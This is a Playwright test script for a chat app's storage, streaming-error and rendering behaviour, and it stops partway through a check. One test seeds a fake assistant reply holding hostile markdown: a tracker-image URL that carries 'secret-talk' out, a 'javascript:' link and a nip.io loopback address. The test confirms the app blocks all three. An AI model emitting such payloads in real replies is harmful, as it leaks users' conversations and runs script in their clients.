// Functional assertions the screenshots cannot make. Every failure exits 1
// with a loud message — a passing run prints one line per check.
// Run: dev server on 5173 (+ mock on 18081 for stream tests),
// then `node scripts/verify.mjs [test ...]`.
import { chromium } from "@playwright/test";
import { appendTail } from "../src/lib/tail.ts";
import { crescentEntriesFor } from "../src/app/crescentLayout.ts";
import {
  ARRIVING_ATTRIBUTE as arrivingAttribute,
  HANDOFF_ATTRIBUTE as handoffAttribute,
  HANDOFF_MS as handoffMs,
  LEAVING_ATTRIBUTE as leavingAttribute,
} from "../src/app/handoff.ts";
import { zipSync, strToU8 } from "fflate";
import { fileURLToPath } from "node:url";
import { installBrainStub } from "./lib/brain-stub.mjs";

const APP = "http://localhost:5173";
// Copied on purpose, the way dev/smoke-react.mjs keeps its strings: node
// cannot import chat.ts (its own imports are extensionless), and a copied
// sentence goes red the day the product's changes.
const DOOR_SILENT_TEXT = "The door did not answer, so the state of this device's slot is unknown.";
const CONV_KEY = "crescent-chat.conversations.v1";
const SET_KEY = "crescent-chat.settings.v1";
const THEME_KEY = "crescent-chat.theme.v1";

let failures = 0;

function check(name, ok, detail = "") {
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? ` — ${detail}` : ""}`);
  if (!ok) failures++;
}

async function seed(page, { settings = null, convos = [], theme = "light" }) {
  // The remote-server fields are not settings anymore: a seeded endpoint
  // and token arrive as the BRAIN's own answers — the road the app reads
  // them from — and the stored record keeps only what storage holds.
  const { endpoint, token, ...stored } = settings ?? {};
  await page.addInitScript(
    ({ cKey, sKey, tKey, settings, convos, theme }) => {
      localStorage.clear();
      localStorage.setItem(tKey, theme);
      if (document.documentElement) document.documentElement.dataset.theme = theme;
      if (settings) localStorage.setItem(sKey, JSON.stringify(settings));
      if (convos.length) localStorage.setItem(cKey, JSON.stringify(convos));
    },
    { cKey: CONV_KEY, sKey: SET_KEY, tKey: THEME_KEY, settings: settings ? stored : null, convos, theme },
  );
  if (endpoint) {
    await page.addInitScript(installBrainStub, {
      state: { kind: "running", endpoint, model: stored.model ?? "" },
      credential: token ?? "",
    });
  }
}

async function stored(page, key) {
  return page.evaluate((k) => localStorage.getItem(k), key);
}

/** Screenshots land in chat/shots from any working directory: `npm run`
    resolves from chat/, but `node scripts/verify.mjs` from the repo root let
    Playwright resolve "shots/..." against the root and grow a stray tree
    there — the anchoring shots.mjs already has, applied here too. */
async function shot(page, path) {
  await page.screenshot({ path: fileURLToPath(new URL(`../${path}`, import.meta.url)) });
}

const okSettings = (model) => ({
  endpoint: "http://127.0.0.1:18081/ok",
  token: "t",
  model,
});

async function sendAndWait(page, text, marker, timeout = 25000) {
  await page.getByRole("textbox", { name: "Message" }).fill(text);
  await page.getByRole("textbox", { name: "Message" }).press("Enter");
  // A wait that stands in for an assertion must FAIL as one, never as a
  // raw TimeoutError (round-24 rule).
  try {
    await page.waitForFunction(
      (m) => document.querySelector(".thread")?.textContent?.includes(m),
      marker,
      { timeout },
    );
  } catch {
    check(`arrived: ${marker}`, false, "wait timed out");
  }
}

async function waitSummary(page, label) {
  try {
    await page.waitForFunction(
      () => document.querySelector(".thought-face")?.textContent?.includes("Thought for"),
      null,
      { timeout: 20000 },
    );
  } catch {
    check(label, false, "summary never settled");
  }
}

async function openSidebar(page, titlePart) {
  const toggle = page.getByRole("button", { name: "Show conversations", exact: true });
  if (await toggle.isVisible()) await toggle.click();
  await page
    .locator(".sidebar")
    .getByRole("button", { name: new RegExp(titlePart.slice(0, 24), "i") })
    .first()
    .click();
  await page.waitForTimeout(400);
}

/** Open the app AT THE CHAT. The brain is the home page now, so most states
    in this file live one click past it — the writing bar's Chat button. This
    harness used to `goto` and fill the composer at once, which stopped working
    the day the home surface changed, and those tests have been timing out
    since. The click is conditional so it cannot break if the landing view
    moves again. (The same helper, with the same comment, is `openApp` in
    `shots.mjs` — one convention across both harnesses, not two.) */
async function openChat(page) {
  await page.goto(APP);
  const chat = page.locator(".brain-bar-chat");
  if ((await chat.count()) > 0) await chat.first().click();
}

function xmlEsc(s) {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

// Minimal valid 1-2 page PDF with computed xref (latin1, ASCII content).
function makePdf(pages) {
  const enc = (s) => Buffer.from(s, "latin1");
  const esc = (s) => s.replace(/\\/g, "\\\\").replace(/\(/g, "\\(").replace(/\)/g, "\\)");
  const objects = [];
  const kids = [];
  let next = 4;
  for (const text of pages) {
    const stream = Buffer.from(`BT /F1 12 Tf 72 720 Td (${esc(text)}) Tj ET`, "latin1");
    kids.push(next);
    objects[next] = enc(
      `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents ${next + 1} 0 R >>`,
    );
    objects[next + 1] = Buffer.concat([
      enc(`<< /Length ${stream.length} >>\nstream\n`),
      stream,
      enc("\nendstream"),
    ]);
    next += 2;
  }
  objects[1] = enc("<< /Type /Catalog /Pages 2 0 R >>");
  objects[2] = enc(`<< /Type /Pages /Kids [${kids.map((k) => `${k} 0 R`).join(" ")}] /Count ${pages.length} >>`);
  objects[3] = enc("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>");
  const total = next - 1;
  const out = [enc("%PDF-1.4\n")];
  const offsets = [0];
  for (let i = 1; i <= total; i++) {
    offsets[i] = out.reduce((n, b) => n + b.length, 0);
    out.push(enc(`${i} 0 obj\n`), objects[i], enc("\nendobj\n"));
  }
  const xrefAt = out.reduce((n, b) => n + b.length, 0);
  let xref = `xref\n0 ${total + 1}\n0000000000 65535 f \n`;
  for (let i = 1; i <= total; i++) xref += `${String(offsets[i]).padStart(10, "0")} 00000 n \n`;
  out.push(enc(`${xref}trailer\n<< /Size ${total + 1} /Root 1 0 R >>\nstartxref\n${xrefAt}\n%%EOF`));
  return Buffer.concat(out);
}

function makeDocx(paras) {
  const doc =
    `<?xml version="1.0" encoding="UTF-8"?>` +
    `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>` +
    paras.map((p) => `<w:p><w:r><w:t>${xmlEsc(p)}</w:t></w:r></w:p>`).join("") +
    `</w:body></w:document>`;
  const types =
    `<?xml version="1.0" encoding="UTF-8"?>` +
    `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">` +
    `<Default Extension="xml" ContentType="application/xml"/>` +
    `<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>` +
    `</Types>`;
  return Buffer.from(zipSync({ "[Content_Types].xml": strToU8(types), "word/document.xml": strToU8(doc) }));
}

function makePptx(slides) {
  const parts = {
    "[Content_Types].xml": strToU8(
      `<?xml version="1.0" encoding="UTF-8"?>` +
        `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">` +
        `<Default Extension="xml" ContentType="application/xml"/>` +
        slides
          .map(
            (_, i) =>
              `<Override PartName="/ppt/slides/slide${i + 1}.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>`,
          )
          .join("") +
        `</Types>`,
    ),
  };
  slides.forEach((text, i) => {
    parts[`ppt/slides/slide${i + 1}.xml`] = strToU8(
      `<?xml version="1.0" encoding="UTF-8"?>` +
        `<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">` +
        `<p:cSld><p:spTree><p:sp><p:txBody><a:bodyPr/><a:p><a:r><a:t>${xmlEsc(text)}</a:t></a:r></a:p></p:txBody></p:sp></p:spTree></p:cSld></p:sld>`,
    );
  });
  return Buffer.from(zipSync(parts));
}

async function lastBody(page) {
  const res = await page.evaluate(async () => {
    const r = await fetch("http://127.0.0.1:18081/__last-body");
    return r.json();
  });
  return JSON.parse(res.body ?? "null");
}

/** Every request body the mock has seen, oldest first — a tool round trip is a
    sequence, and the last body can only show its end. */
async function allBodies(page) {
  const res = await page.evaluate(async () => {
    const r = await fetch("http://127.0.0.1:18081/__bodies");
    return r.json();
  });
  return (res.bodies ?? []).map((body) => JSON.parse(body));
}

async function resetMock(page) {
  await page.evaluate(async () => {
    await fetch("http://127.0.0.1:18081/__reset", { method: "POST" });
  });
}

/**
 * The desktop door, stubbed for the browser: a place to answer the two web
 * commands and to watch what was asked of them. `tools` are the definitions a
 * real bridge would be given; without one, none are offered at all.
 */
async function stubDoor(page, { search = null, fetch = null, hang = false } = {}) {
  await page.addInitScript(
    ({ search, fetchResult, hang }) => {
      window.__TOOL_CALLS__ = [];
      window.__TAURI__ = {
        core: {
          invoke: async (command, args) => {
            // The brain's pair, answered wherever a brain was seeded: read
            // at call time, so a stub installed before this one keeps them.
            const brain = window.__STUB_BRAIN__;
            if (brain && command === "brain_state") return brain.state;
            if (brain && command === "brain_host_credential") return brain.credential;
            if (command === "brain_web_stop") {
              window.__TOOL_CALLS__.push({ command, args });
              return null;
            }
            if (command === "brain_open_url") {
              window.__TOOL_CALLS__.push({ command, args });
              return null;
            }
            if (command.startsWith("brain_web_")) {
              window.__TOOL_CALLS__.push({ command, args });
              if (hang) return new Promise(() => {});
              if (command === "brain_web_search") return search;
              return fetchResult;
            }
            // The other surfaces read their own commands; none of them is part
            // of these tests, so they answer as an unknown state.
            return null;
          },
        },
        // The brain surface subscribes to the walk's progress on mount; the
        // real door resolves to an unlisten function.
        event: { listen: () => Promise.resolve(() => {}) },
      };
    },
    { search, fetchResult: fetch, hang },
  );
}

/** Seeded once, not on every document: a reload must not wipe what the page
    wrote, which is what the persistence checks are about. */
async function seedOnce(page, settings) {
  const { endpoint, token, ...stored } = settings ?? {};
  await page.addInitScript((settings) => {
    if (sessionStorage.getItem("verified-seeded")) return;
    sessionStorage.setItem("verified-seeded", "1");
    localStorage.clear();
    localStorage.setItem("crescent-chat.theme.v1", "light");
    localStorage.setItem("crescent-chat.settings.v1", JSON.stringify(settings));
  }, settings ? stored : null);
  if (endpoint) {
    await page.addInitScript(installBrainStub, {
      state: { kind: "running", endpoint, model: stored.model ?? "" },
      credential: token ?? "",
    });
  }
}

/**
 * The disk half of the desktop door, stubbed for the browser: answers the
 * four files commands from fixture data and records every call, so a test
 * can assert what the panel asked of Rust. Search hits travel on the
 * `brain_files_search` event, so listen is captured and `__EMIT_FILES__`
 * lets the test play the batches — including a late one from a search the
 * user already replaced, which is exactly the arrival the page must drop.
 */
async function stubFileDoor(page, { roots = null, listings = {}, read = [], search = null } = {}) {
  await page.addInitScript(
    ({ roots, listings, read, search }) => {
      window.__FILE_CALLS__ = [];
      // The real bus unlistens ONE registration, not every listener an
      // event happens to have — removal here is identity-scoped the same
      // way, or a StrictMode remount reads as a leak that is not one.
      window.__FILE_LISTENERS__ = {};
      window.__EMIT_FILES__ = (payload) => {
        const handlers = window.__FILE_LISTENERS__["brain_files_search"];
        if (handlers) for (const handler of [...handlers]) handler(payload);
      };
      const asBuffer = (bytes) => {
        const buffer = new ArrayBuffer(bytes.length);
        new Uint8Array(buffer).set(bytes);
        return buffer;
      };
      window.__TAURI__ = {
        core: {
          invoke: async (command, args) => {
            window.__FILE_CALLS__.push({ command, args });
            if (command === "brain_files_roots") return roots;
            if (command === "brain_files_list") return listings[args.path] ?? null;
            if (command === "brain_files_read") return asBuffer(read);
            if (command === "brain_files_search") return { ...(search ?? {}), id: args.id };
            return null;
          },
        },
        event: {
          listen: async (event, handler) => {
            (window.__FILE_LISTENERS__[event] ??= new Set()).add(handler);
            return () => {
              window.__FILE_LISTENERS__[event]?.delete(handler);
            };
          },
        },
      };
    },
    { roots, listings, read, search },
  );
}

const toolSettings = (model, webTools = true) => ({
  endpoint: "http://127.0.0.1:18081/ok",
  token: "t",
  model,
  webTools,
});

const LISBON = "1. Lisbon weekend forecast\n   URL: https://example.com/lisbon\n   Mild, rain on Sunday evening.";

const tests = {
  // v1 -> v2 migration: nothing lost, never repeats, old key removed.
  async migrate() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await page.addInitScript(() => {
      localStorage.clear();
      localStorage.setItem("crescent-chat.theme.v1", "light");
      localStorage.setItem(
        "crescent-chat.conversations.v1",
        JSON.stringify([
          {
            id: "a",
            title: "First",
            createdAt: 1,
            updatedAt: 2,
            messages: [{ id: "m1", role: "user", content: "hello old world", createdAt: 1 }],
          },
          {
            id: "b",
            title: "Second",
            createdAt: 0,
            updatedAt: 1,
            messages: [],
          },
        ]),
      );
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    const keys = await page.evaluate(() => ({ ...localStorage }));
    check("migrate: old key removed", !("crescent-chat.conversations.v1" in keys));
    check("migrate: flag set", keys["crescent-chat.migrated.v2"] === "1");
    const index = JSON.parse(keys["crescent-chat.index.v2"] ?? "[]");
    check("migrate: index has both", index.length === 2);
    check("migrate: preview derived", index[0]?.preview === "hello old world");
    check("migrate: no payload in index", !("messages" in (index[0] ?? {})));
    const msgs = JSON.parse(keys["crescent-chat.msgs.a.v2"] ?? "[]");
    check("migrate: payload kept", msgs.length === 1 && msgs[0].content === "hello old world");
    // Thread still opens with the migrated messages.
    await openSidebar(page, "First");
    await page.waitForTimeout(400);
    check(
      "migrate: thread shows migrated text",
      ((await page.locator(".thread").textContent()) ?? "").includes("hello old world"),
    );
    await browser.close();
  },

  // What the UI sends must reach the disk: re-read storage after a stream.
  async roundtrip() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Persist me.", "line is open");
    await page.waitForFunction(() => document.querySelector(".composer-stop") === null, null, {
      timeout: 20000,
    });
    await page.waitForTimeout(400);
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    const id = index[0]?.id;
    const msgs = JSON.parse((await stored(page, `crescent-chat.msgs.${id}.v2`)) ?? "[]");
    check("roundtrip: index has the conversation", index.length === 1 && index[0].title === "Persist me.");
    check(
      "roundtrip: payload has user+assistant",
      msgs.length === 2 && msgs[0].content === "Persist me." && msgs[1].content.includes("line is open"),
    );
    await browser.close();
  },

  // Two windows: the second learns without reload (storage event).
  async multiwindow() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const ctx = await browser.newContext({ viewport: { width: 1400, height: 900 } });
    const seedBoth = async (page) => seed(page, { settings: okSettings("x") });
    const p1 = await ctx.newPage();
    await seedBoth(p1);
    await openChat(p1);
    await p1.waitForTimeout(1000);
    const p2 = await ctx.newPage();
    await openChat(p2);
    await p2.waitForTimeout(1000);
    check("multiwindow: p2 starts empty", (await p2.locator(".sidebar-row").count()) === 0);
    await p1.getByRole("textbox", { name: "Message" }).fill("From window one.");
    await p1.getByRole("textbox", { name: "Message" }).press("Enter");
    await p1.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("line is open"),
      null,
      { timeout: 20000 },
    );
    // p2's sidebar updates with no interaction and no reload.
    try {
      await p2.waitForFunction(() => document.querySelectorAll(".sidebar-row").length === 1, null, {
        timeout: 10000,
      });
      check("multiwindow: p2 sees the new row", true);
    } catch {
      check("multiwindow: p2 sees the new row", false, "row never arrived");
    }
    await browser.close();
  },

  // Full disk: the app must say so instead of showing unsaved messages.
  async quota() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1000);
    await page.evaluate(() => {
      // Fill until the disk actually refuses, then top up at 256B granularity.
      // Quota differs per engine and has slack, so a fixed MB count is flaky;
      // after this, free < 256B is PROVEN (a 256B write just threw) while the
      // conversation write needs ~500B — so it cannot succeed.
      const big = "x".repeat(1024 * 1024);
      for (let i = 0; i < 80; i++) {
        try {
          localStorage.setItem(`crescent-chat.probe.${i}`, big);
        } catch {
          break;
        }
      }
      const pad = "p".repeat(256);
      let topups = 0;
      for (let i = 0; i < 8192; i++) {
        try {
          localStorage.setItem(`crescent-chat.pad.${i}`, pad);
          topups++;
        } catch {
          break;
        }
      }
      window.__topups = topups;
    });
    const topups = await page.evaluate(() => window.__topups ?? -1);
    check("quota: disk provably near-full", topups >= 0 && topups < 8192, `${topups} pads fit`);
    await sendAndWait(page, "Nowhere to write.", "line is open");
    // The stream itself works (memory); the banner must admit disk refused.
    const banner = page.locator(".storage-banner");
    check("quota: banner shown", (await banner.count()) === 1);
    check("quota: banner names storage", ((await banner.count()) === 1 && await banner.textContent())?.includes("storage is full") ?? false);
    await shot(page, "shots/31-quota.png");
    await browser.close();
  },
  // The composed URL is shown and correct for every endpoint shape.
  async badurl() {
    const cases = [
      ["http://127.0.0.1:18081/denied", "http://127.0.0.1:18081/denied/v1/chat/completions"],
      ["http://127.0.0.1:18081/denied/", "http://127.0.0.1:18081/denied/v1/chat/completions"],
      [
        "http://127.0.0.1:18081/denied/v1/chat/completions",
        "http://127.0.0.1:18081/denied/v1/chat/completions",
      ],
    ];
    for (const [endpoint, called] of cases) {
      const browser = await chromium.launch({ args: ["--no-sandbox"] });
      const page = await browser.newPage();
      await seed(page, { settings: { endpoint, token: "t", model: "x" } });
      await openChat(page);
      await page.waitForTimeout(1200);
      await sendAndWait(page, "Hello?", "did not accept the key");
      const shown = await page.locator(".error-url").textContent();
      check(`badurl: ${endpoint}`, (shown ?? "").includes(called), shown?.trim());
      await browser.close();
    }
    // .../v1 base composes without doubling and actually streams.
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, {
      settings: { endpoint: "http://127.0.0.1:18081/ok/v1", token: "t", model: "x" },
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Hello?", "line is open");
    check("badurl: /v1 base streams (no doubling)", true);
    await browser.close();
  },

  async forbidden403() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, {
      settings: { endpoint: "http://127.0.0.1:18081/forbidden", token: "t", model: "x" },
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Hello?", "refused the key");
    const body = await page.locator(".thread").textContent();
    check("forbidden: names 403, not 401", (body ?? "").includes("403"));
    await browser.close();
  },

  async split() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("split-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Split it.", "stopped halfway");
    const body = await page.locator(".thread").textContent();
    check("split: frames reassembled", (body ?? "").includes("Split frames reassembled."));
    check("split: missing DONE reported", (body ?? "").includes("stopped halfway"));
    await browser.close();
  },

  async cut() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("cut-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Talk then die.", "stopped halfway");
    const body = await page.locator(".thread").textContent();
    check("cut: partial text kept", (body ?? "").includes("Working through this"));
    await shot(page, "shots/33-cut.png");
    await browser.close();
  },

  async emptycut() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("emptycut-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Say nothing.", "not as a chat stream");
    check("emptycut: honest diagnosis", true);
    await browser.close();
  },

  async json() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("json-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Plain JSON?", "Non-streaming reply");
    check("json: non-streaming body surfaces", true);
    check("json: no error shown", (await page.locator(".error-block").count()) === 0);
    await browser.close();
  },

  async html() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("html-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "A page?", "not as a chat stream");
    const shown = await page.locator(".error-url").textContent();
    check("html: shows called URL", (shown ?? "").includes("/ok/v1/chat/completions"));
    // The failed answer keeps one road out: Try again. The settings road
    // left with the address it used to fix.
    const actions = await page.locator(".error-actions button").allTextContents();
    check(
      "html: the failed answer offers Try again and no settings road",
      actions.includes("Try again") && !actions.includes("Open settings"),
      JSON.stringify(actions),
    );
    await shot(page, "shots/32-html.png");
    await browser.close();
  },

  async networkurl() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    // The brain answers "running" but its endpoint is dead: the door's own
    // activate cannot be reached, so the open is REFUSED with the door's
    // sentence. There is no saved address left to point the chat at — the
    // URL-error copy this used to assert is now reachable only mid-session,
    // when a door dies under a live stream.
    await seed(page, {
      settings: { endpoint: "http://127.0.0.1:18999", token: "t", model: "x" },
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    // It is the SEND that asks the door: the open either mints or is
    // refused, and this door cannot be reached, so the refusal lands as the
    // door's own sentence and the chat never opens.
    await page.getByRole("textbox", { name: "Message" }).fill("Nobody home?");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    try {
      await page.waitForFunction(
        (text) => (document.querySelector(".storage-banner")?.textContent ?? "").includes(text),
        DOOR_SILENT_TEXT,
        { timeout: 8000 },
      );
    } catch {
      // The check below turns the absence into a failure with the text it saw.
    }
    const notice = (await page.locator(".storage-banner").textContent().catch(() => null)) ?? "";
    check(
      "network: an unreachable door refuses the open with its own sentence",
      notice.includes(DOOR_SILENT_TEXT),
      notice.trim() || "no notice shown",
    );
    check(
      "network: and no chat opens against a corpse",
      (await page.locator(".thread").count()) === 0,
    );
    await shot(page, "shots/34-network.png");
    await browser.close();
  },

  // B6: streams are per-conversation. Stopping B must not touch A.
  async twostream() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("slow-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    const say = async (text) => {
      await page.getByRole("textbox", { name: "Message" }).fill(text);
      await page.getByRole("textbox", { name: "Message" }).press("Enter");
    };
    const open = async (title) => {
      await page
        .locator(".sidebar")
        .getByRole("button", { name: new RegExp(title, "i") })
        .first()
        .click();
      await page.waitForTimeout(300);
    };
    await say("First topic");
    await page.waitForTimeout(800);
    await page.getByRole("button", { name: "+ New chat" }).click();
    await say("Second topic");
    await page.waitForTimeout(1500);
    // Both threads hold partial text: two live streams, no interference.
    await open("First topic");
    const lenA1 = ((await page.locator(".thread").textContent()) ?? "").length;
    await open("Second topic");
    const lenB1 = ((await page.locator(".thread").textContent()) ?? "").length;
    check("twostream: both streams alive", lenA1 > 100 && lenB1 > 100, `${lenA1}/${lenB1} chars`);
    // Stop B from B: A must keep growing, B keeps its partial text.
    await page.getByRole("button", { name: "Stop generating" }).click();
    await page.waitForTimeout(500);
    await open("First topic");
    await page.waitForTimeout(1500);
    const lenA2 = ((await page.locator(".thread").textContent()) ?? "").length;
    check("twostream: A survives B stop", lenA2 > lenA1, `${lenA1} -> ${lenA2} chars`);
    await open("Second topic");
    const bodyB = (await page.locator(".thread").textContent()) ?? "";
    check("twostream: B stopped honestly", bodyB.includes("Stopped early"));
    await browser.close();
  },

  // ⌘K / Ctrl+K focuses search from anywhere (explicit brief requirement).
  async cmdk() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).click();
    await page.keyboard.press("Control+k");
    await page.waitForTimeout(300);
    const focused = await page.evaluate(() => document.activeElement?.id ?? "");
    check("cmdk: search focused", focused === "conversation-search", focused);
    await browser.close();
  },

  // Rename: index-only, payload untouched on disk.
  async rename() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, {
      settings: okSettings("x"),
      convos: [
        {
          id: "r1",
          title: "Old title",
          createdAt: 1,
          updatedAt: 1,
          messages: [{ id: "m1", role: "user", content: "keep me", createdAt: 1 }],
        },
      ],
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator(".sidebar-row").first().hover();
    await page.getByRole("button", { name: "Rename" }).click();
    await page.locator(".sidebar-rename").fill("New title");
    await page.locator(".sidebar-rename").press("Enter");
    await page.waitForTimeout(400);
    const sidebar = (await page.locator(".sidebar").textContent()) ?? "";
    check("rename: sidebar shows new title", sidebar.includes("New title"));
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    check("rename: index retitled", index[0]?.title === "New title");
    check("rename: search follows title", (index[0]?.search ?? "").startsWith("New title"));
    const msgs = JSON.parse((await stored(page, "crescent-chat.msgs.r1.v2")) ?? "[]");
    check("rename: payload untouched", msgs.length === 1 && msgs[0].content === "keep me");
    await browser.close();
  },

  // Delete: two steps in the row, index and payload both gone.
  async deleterow() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, {
      settings: okSettings("x"),
      convos: [
        {
          id: "d1",
          title: "Doomed",
          createdAt: 1,
          updatedAt: 1,
          messages: [{ id: "m1", role: "user", content: "bye", createdAt: 1 }],
        },
      ],
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await openSidebar(page, "Doomed");
    await page.locator(".sidebar-row").first().hover();
    await page.getByRole("button", { name: "Delete" }).first().click();
    await page.getByRole("button", { name: "Sure?" }).click();
    await page.waitForTimeout(400);
    check("delete: row gone", (await page.locator(".sidebar-row").count()) === 0);
    check("delete: thread back to empty", (await page.locator(".empty").count()) === 1);
    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
    check("delete: index empty", index.length === 0);
    check("delete: payload key gone", (await stored(page, "crescent-chat.msgs.d1.v2")) === null);
    await browser.close();
  },

  // Search over 1000 index entries with zero payload keys on disk.
  async search1000() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await page.addInitScript(() => {
      localStorage.clear();
      localStorage.setItem("crescent-chat.theme.v1", "light");
      const index = [];
      for (let i = 0; i < 1000; i++) {
        const title = i === 999 ? "Quarterly taxes reckoning" : `Conversation ${i}`;
        index.push({
          id: `c${i}`,
          title,
          createdAt: i,
          updatedAt: 100000 - i,
          preview: `preview ${i}`,
          search: `${title}\npreview ${i}`,
          hasMessages: true,
        });
      }
      localStorage.setItem("crescent-chat.index.v2", JSON.stringify(index));
      localStorage.setItem("crescent-chat.migrated.v2", "1");
    });
    await openChat(page);
    await page.waitForTimeout(1500);
    check("search1000: rows render without payloads", (await page.locator(".sidebar-row").count()) > 10);
    const t0 = Date.now();
    await page.getByLabel("Search conversations").fill("taxes reckoning");
    let narrowed = false;
    try {
      await page.waitForFunction(() => document.querySelectorAll(".sidebar-row").length === 1, null, {
        timeout: 10000,
      });
      narrowed = true;
    } catch {
      check("search1000: narrows to one", false, "never narrowed");
    }
    const ms = Date.now() - t0;
    if (narrowed) check("search1000: narrows to one", true, `${ms}ms`);
    check("search1000: still no payload keys", await page.evaluate(() => {
      for (let i = 0; i < localStorage.length; i++) {
        if ((localStorage.key(i) ?? "").startsWith("crescent-chat.msgs.")) return false;
      }
      return true;
    }));
    await browser.close();
  },

  // The model cannot phone home: no img elements, no javascript: hrefs.
  async imgblocked() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, {
      settings: okSettings("x"),
      convos: [
        {
          id: "s1",
          title: "Sneaky model",
          createdAt: 1,
          updatedAt: 1,
          messages: [
            { id: "m1", role: "user", content: "Show me a picture.", createdAt: 1 },
            {
              id: "m2",
              role: "assistant",
              content:
                "Here:\n\n![tracker](https://tracker.example/pixel.gif?c=secret-talk)\n\nAnd [evil](javascript:alert(1)) and [good](https://example.com/page) and [inward](https://foo.127.0.0.1.nip.io/).",
              createdAt: 2,
            },
          ],
        },
      ],
    });
    await stubDoor(page, {});
    // `goto` lands on the brain home; the chat and its sidebar are one click
    // past it (the same conditional click `shots.mjs` makes).
    await openChat(page);
    await page.waitForTimeout(1200);
    await openSidebar(page, "Sneaky model");
    await page.waitForTimeout(300);
    check("imgblocked: zero img elements", (await page.locator(".thread img").count()) === 0);
    check("imgblocked: notice shown", (await page.locator(".blocked-image").count()) === 1);
    // Not one anchor in the answer: a link the model wrote is a button now, and
    // a Tauri webview cannot follow an `href` anyway (2026-09-19, the same
    // defect as the tool sources).
    check("imgblocked: no hrefs at all in the answer", (await page.locator(".thread a").count()) === 0, `${await page.locator(".thread a").count()} anchors`);
    const shown = (await page.locator(".thread").textContent()) ?? "";
    check("imgblocked: a refused address is shown as text", shown.includes("evil") && shown.includes("inward"), shown.slice(0, 200));
    check(
      "imgblocked: no address that resolves back to this machine is clickable",
      (await page.locator(".thread .tool-link").allTextContents()).every((label) => !label.includes("nip.io")),
      JSON.stringify(await page.locator(".thread .tool-link").allTextContents()),
    );

    // "Open address" beside the blocked image, and a link the model wrote: both
    // are commands now, with the address Rust checks.
    const links = await page.locator(".thread .tool-link").allTextContents();
    check("imgblocked: the good link and the image address are offered", links.length === 2, JSON.stringify(links));
    await page.locator(".blocked-image .tool-link").click();
    await page.waitForTimeout(300);
    await page.getByRole("link", { name: "good" }).click().catch(async () => {
      await page.locator(".tool-link", { hasText: "good" }).click();
    });
    await page.waitForTimeout(300);
    const opened = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((call) => call.command === "brain_open_url");
    check(
      "imgblocked: both clicks ask Rust to open the address",
      opened.length === 2 &&
        opened[0].args?.url === "https://tracker.example/pixel.gif?c=secret-talk" &&
